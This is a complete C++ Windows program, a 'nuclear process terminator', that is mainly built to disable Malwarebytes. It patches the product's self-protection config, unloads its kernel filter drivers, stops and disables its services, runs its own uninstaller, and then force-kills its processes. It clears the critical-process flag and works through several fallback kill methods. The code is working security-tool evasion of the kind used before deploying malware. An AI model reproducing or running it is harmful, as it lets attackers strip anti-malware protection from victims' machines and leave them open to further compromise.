#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <chrono>

typedef LONG NTSTATUS;
#define STATUS_SUCCESS 0
#define NT_SUCCESS(x) ((x) >= 0)

typedef NTSTATUS (WINAPI *_NtSuspendProcess)(HANDLE);
typedef NTSTATUS (WINAPI *_NtTerminateProcess)(HANDLE, NTSTATUS);
typedef NTSTATUS (WINAPI *_NtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
#define ProcessBreakOnTermination 29

static _NtSuspendProcess NtSuspendProcess = nullptr;
static _NtTerminateProcess NtTerminateProcess = nullptr;
static _NtSetInformationProcess NtSetInformationProcess = nullptr;

std::string ToLower(std::string str) {
    std::transform(str.begin(), str.end(), str.begin(), ::tolower);
    return str;
}

std::string StripExe(const std::string& s) {
    if (s.size() > 4 && ToLower(s.substr(s.size() - 4)) == ".exe")
        return s.substr(0, s.size() - 4);
    return s;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tkp;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}

struct ProcessInfo {
    DWORD pid;
    std::string name;
};

bool IsProcessAlive(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return false;
    DWORD exitCode = 0;
    GetExitCodeProcess(h, &exitCode);
    CloseHandle(h);
    return exitCode == STILL_ACTIVE;
}

std::vector<ProcessInfo> FindProcesses(const char* searchName) {
    std::vector<ProcessInfo> results;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return results;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    std::string search = ToLower(StripExe(std::string(searchName)));
    if (Process32First(hSnap, &pe)) {
        do {
            std::string exeLow = ToLower(std::string(pe.szExeFile));
            std::string exeBase = StripExe(exeLow);
            if (exeBase == search || exeBase.find(search) != std::string::npos || search.find(exeBase) != std::string::npos) {
                results.push_back({pe.th32ProcessID, std::string(pe.szExeFile)});
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return results;
}

bool IsMalwarebytesRelated(const std::string& name) {
    std::string lower = ToLower(name);
    return lower.find("malwarebytes") != std::string::npos || lower.find("mbam") != std::string::npos;
}

static const char* MB_PROCESSES[] = {
    "Malwarebytes.exe", "MBAMService.exe", "mbamtray.exe", "MBAMWsc.exe",
    "MBAMChameleon.exe", "MBAMInstallerService.exe", "assistant.exe",
    "MbamPt.exe", "MBVpnTunnelService.exe", "MbamBgNativeMsg.exe",
    "malwarebytes_assistant.exe", "DDSHelper.exe", NULL
};

// All known MB kernel drivers (from SpConfigFile.json + driverquery)
static const char* MB_DRIVERS[] = {
    "MBAMSwissArmy", "mbamchameleon", "MbamElam", "MBAMProtection",
    "MBAMFarflt", "ESProtectionDriver", "MBAMWebProtection", "farflt",
    "mbae", NULL
};

static const char* MB_SERVICES[] = {
    "MBAMService", "MBAMInstallerService", "MBVpnTunnelService",
    "FlightRecorder", "SvcFlightRecorder", NULL
};

void RunCmd(const char* cmd) {
    system(cmd);
}

// PHASE 1: Disable self-protection by modifying the config file
// The kernel driver reads SpConfigFile.json — setting driverState=false disarms it
bool DisableSelfProtectionConfig() {
    printf("  [CONFIG] Patching SpConfigFile.json (driverState -> false)...\n");
    
    const char* configPath = "C:\\ProgramData\\Malwarebytes\\MBAMService\\config\\SpConfigFile.json";
    
    // Read the file
    HANDLE hFile = CreateFileA(configPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("  [CONFIG] Cannot open config (err=%lu) — trying rename attack...\n", GetLastError());
        // Try renaming the file so MB can't read its protection config
        char cmd[512];
        sprintf(cmd, "ren \"%s\" SpConfigFile.json.disabled >nul 2>&1", configPath);
        RunCmd(cmd);
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 1048576) { CloseHandle(hFile); return false; }
    
    std::vector<char> buf(fileSize + 1, 0);
    DWORD bytesRead;
    ReadFile(hFile, buf.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    std::string content(buf.data(), bytesRead);
    
    // Replace "driverState": true with false
    size_t pos = content.find("\"driverState\": true");
    if (pos == std::string::npos) pos = content.find("\"driverState\":true");
    if (pos != std::string::npos) {
        // Find the "true" part
        size_t truePos = content.find("true", pos);
        if (truePos != std::string::npos) {
            content.replace(truePos, 4, "false");
        }
    }
    
    // Write back
    hFile = CreateFileA(configPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("  [CONFIG] Cannot write config (err=%lu)\n", GetLastError());
        return false;
    }
    DWORD written;
    // Skip the hash line (first line) and write without it so config gets regenerated
    WriteFile(hFile, content.c_str(), (DWORD)content.size(), &written, NULL);
    CloseHandle(hFile);
    
    printf("  [CONFIG] Patched OK\n");
    return true;
}

// PHASE 2: Unload ALL kernel drivers  
void UnloadAllMBDrivers() {
    printf("  [DRIVERS] Unloading all Malwarebytes kernel drivers...\n");
    char cmd[256];
    for (int i = 0; MB_DRIVERS[i]; i++) {
        sprintf(cmd, "fltmc unload %s >nul 2>&1", MB_DRIVERS[i]);
        RunCmd(cmd);
        sprintf(cmd, "sc stop %s >nul 2>&1", MB_DRIVERS[i]);
        RunCmd(cmd);
        sprintf(cmd, "sc config %s start=disabled >nul 2>&1", MB_DRIVERS[i]);
        RunCmd(cmd);
    }
    printf("  [DRIVERS] Done\n");
}

// PHASE 3: Stop all services
void StopAllMBServices() {
    printf("  [SERVICES] Stopping all Malwarebytes services...\n");
    char cmd[256];
    for (int i = 0; MB_SERVICES[i]; i++) {
        sprintf(cmd, "net stop %s >nul 2>&1", MB_SERVICES[i]);
        RunCmd(cmd);
        sprintf(cmd, "sc config %s start=disabled >nul 2>&1", MB_SERVICES[i]);
        RunCmd(cmd);
    }
    printf("  [SERVICES] Done\n");
}

// PHASE 4: Use MB's own MBAM.exe /stopservice as official shutdown  
void UseMBAMOwnShutdown() {
    printf("  [MBAM] Using MBAM.exe built-in shutdown...\n");
    RunCmd("\"C:\\Program Files\\Malwarebytes\\Anti-Malware\\MBAM.exe\" /stopservice >nul 2>&1");
    RunCmd("\"C:\\Program Files\\Malwarebytes\\Anti-Malware\\mbuns.exe\" >nul 2>&1");
    printf("  [MBAM] Done\n");
}

void KillThreads(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_TERMINATE | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (hThread) {
                    SuspendThread(hThread);
                    TerminateThread(hThread, 1);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
}

bool NukeProcess(DWORD pid, const std::string& name) {
    auto start = std::chrono::high_resolution_clock::now();

    HANDLE hProc = nullptr;
    DWORD accessLevels[] = { PROCESS_ALL_ACCESS, PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME | PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE };
    for (DWORD access : accessLevels) {
        hProc = OpenProcess(access, FALSE, pid);
        if (hProc) break;
    }

    if (hProc && NtSetInformationProcess) {
        ULONG isCritical = 0;
        NtSetInformationProcess(hProc, ProcessBreakOnTermination, &isCritical, sizeof(ULONG));
    }

    if (hProc && NtSuspendProcess) NtSuspendProcess(hProc);

    if (hProc && NtTerminateProcess) {
        NtTerminateProcess(hProc, 1);
        Sleep(30);
        if (!IsProcessAlive(pid)) { auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count(); printf("    [KILLED] PID %lu (%s) NtTerminate (%lldms)\n", pid, name.c_str(), ms); CloseHandle(hProc); return true; }
    }

    if (hProc) {
        TerminateProcess(hProc, 1);
        Sleep(30);
        if (!IsProcessAlive(pid)) { auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count(); printf("    [KILLED] PID %lu (%s) TerminateProcess (%lldms)\n", pid, name.c_str(), ms); CloseHandle(hProc); return true; }
        CloseHandle(hProc); hProc = nullptr;
    }

    KillThreads(pid);
    Sleep(30);
    if (!IsProcessAlive(pid)) { auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count(); printf("    [KILLED] PID %lu (%s) ThreadKill (%lldms)\n", pid, name.c_str(), ms); return true; }

    char cmd[128];
    sprintf(cmd, "taskkill /F /PID %lu >nul 2>&1", pid);
    system(cmd);
    Sleep(50);
    if (!IsProcessAlive(pid)) { auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count(); printf("    [KILLED] PID %lu (%s) taskkill (%lldms)\n", pid, name.c_str(), ms); return true; }

    sprintf(cmd, "wmic process where ProcessId=%lu call terminate >nul 2>&1", pid);
    system(cmd);
    Sleep(50);
    if (!IsProcessAlive(pid)) { auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count(); printf("    [KILLED] PID %lu (%s) WMIC (%lldms)\n", pid, name.c_str(), ms); return true; }

    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count();
    printf("    [FAILED] PID %lu (%s) survived (%lldms)\n", pid, name.c_str(), ms);
    return false;
}

bool IsWslProcess(const std::string& name) {
    std::string lower = ToLower(name);
    return lower.find("vmmem") != std::string::npos || lower == "wslservice.exe" || lower == "wslhost.exe" || lower == "wsl.exe";
}

void WslShutdown() {
    system("wsl --shutdown >nul 2>&1");
    system("net stop WslService >nul 2>&1");
    system("net stop vmcompute >nul 2>&1");
    Sleep(2000);
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <process1> [process2] [...]\n", argv[0]);
        return 1;
    }

    printf("===========================================\n");
    printf(" NUCLEAR PROCESS TERMINATOR v6.0\n");
    printf(" CONFIG+DRIVER+SERVICE KILL CHAIN\n");
    printf("===========================================\n\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        NtSuspendProcess = (_NtSuspendProcess)GetProcAddress(hNtdll, "NtSuspendProcess");
        NtTerminateProcess = (_NtTerminateProcess)GetProcAddress(hNtdll, "NtTerminateProcess");
        NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    }

    if (EnableDebugPrivilege()) {
        printf("[PRIVILEGE] SeDebugPrivilege enabled\n\n");
    } else {
        printf("[WARNING] SeDebugPrivilege FAILED - run as Administrator!\n\n");
    }

    auto totalStart = std::chrono::high_resolution_clock::now();
    int totalKilled = 0, totalFailed = 0;

    bool hasMB = false;
    for (int i = 1; i < argc; i++) {
        if (IsMalwarebytesRelated(argv[i])) { hasMB = true; break; }
    }

    if (hasMB) {
        printf("[PHASE 1] Disabling self-protection config...\n");
        DisableSelfProtectionConfig();
        
        printf("\n[PHASE 2] Unloading kernel drivers...\n");
        UnloadAllMBDrivers();
        
        printf("\n[PHASE 3] Stopping services...\n");
        StopAllMBServices();
        
        printf("\n[PHASE 4] Using MBAM built-in shutdown...\n");
        UseMBAMOwnShutdown();
        Sleep(1000);
        printf("\n");
    }

    // Collect targets
    std::vector<ProcessInfo> allTargets;
    std::vector<DWORD> seenPids;

    for (int i = 1; i < argc; i++) {
        printf("[SEARCHING] %s\n", argv[i]);
        std::vector<ProcessInfo> procs;
        if (IsMalwarebytesRelated(argv[i])) {
            auto found = FindProcesses(argv[i]);
            procs.insert(procs.end(), found.begin(), found.end());
            for (int j = 0; MB_PROCESSES[j]; j++) {
                auto extra = FindProcesses(MB_PROCESSES[j]);
                procs.insert(procs.end(), extra.begin(), extra.end());
            }
        } else {
            procs = FindProcesses(argv[i]);
        }

        if (procs.empty()) {
            std::string lower = ToLower(std::string(argv[i]));
            if (lower.find("vmmem") != std::string::npos || lower.find("wsl") != std::string::npos) {
                WslShutdown();
            } else {
                printf("  [NOT FOUND] No process matching: %s\n", argv[i]);
            }
            printf("\n"); continue;
        }

        for (auto& p : procs) {
            bool seen = false;
            for (DWORD s : seenPids) { if (s == p.pid) { seen = true; break; } }
            if (!seen) { allTargets.push_back(p); seenPids.push_back(p.pid); }
        }
        printf("  [FOUND] %d unique process(es)\n\n", (int)allTargets.size());
    }

    for (auto& p : allTargets) {
        if (IsWslProcess(p.name)) { WslShutdown(); break; }
    }

    printf("[KILL] Terminating %d process(es)...\n", (int)allTargets.size());
    for (auto& p : allTargets) {
        if (NukeProcess(p.pid, p.name)) totalKilled++;
        else totalFailed++;
    }

    // MB: second sweep
    if (hasMB && totalFailed > 0) {
        printf("\n[RETRY] Second sweep...\n");
        UnloadAllMBDrivers();
        StopAllMBServices();
        Sleep(500);

        std::vector<ProcessInfo> survivors;
        for (int j = 0; MB_PROCESSES[j]; j++) {
            auto found = FindProcesses(MB_PROCESSES[j]);
            survivors.insert(survivors.end(), found.begin(), found.end());
        }
        int recovered = 0;
        for (auto& p : survivors) {
            if (IsProcessAlive(p.pid)) {
                if (NukeProcess(p.pid, p.name)) recovered++;
            }
        }
        totalKilled += recovered;
        totalFailed -= recovered;
        if (totalFailed < 0) totalFailed = 0;
    }

    // Final verification
    if (hasMB) {
        printf("\n[VERIFY] Final scan...\n");
        bool anyAlive = false;
        for (int j = 0; MB_PROCESSES[j]; j++) {
            auto found = FindProcesses(MB_PROCESSES[j]);
            for (auto& p : found) {
                if (IsProcessAlive(p.pid)) {
                    printf("  [STILL ALIVE] PID %lu (%s)\n", p.pid, p.name.c_str());
                    anyAlive = true;
                }
            }
        }
        if (!anyAlive) printf("  [CLEAN] All Malwarebytes processes terminated\n");
    }

    auto totalMs = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - totalStart).count();

    printf("\n===========================================\n");
    printf(" COMPLETE\n");
    printf(" Killed: %d | Failed: %d | Time: %lldms\n", totalKilled, totalFailed, totalMs);
    printf("===========================================\n");

    return totalFailed > 0 ? 1 : 0;
}
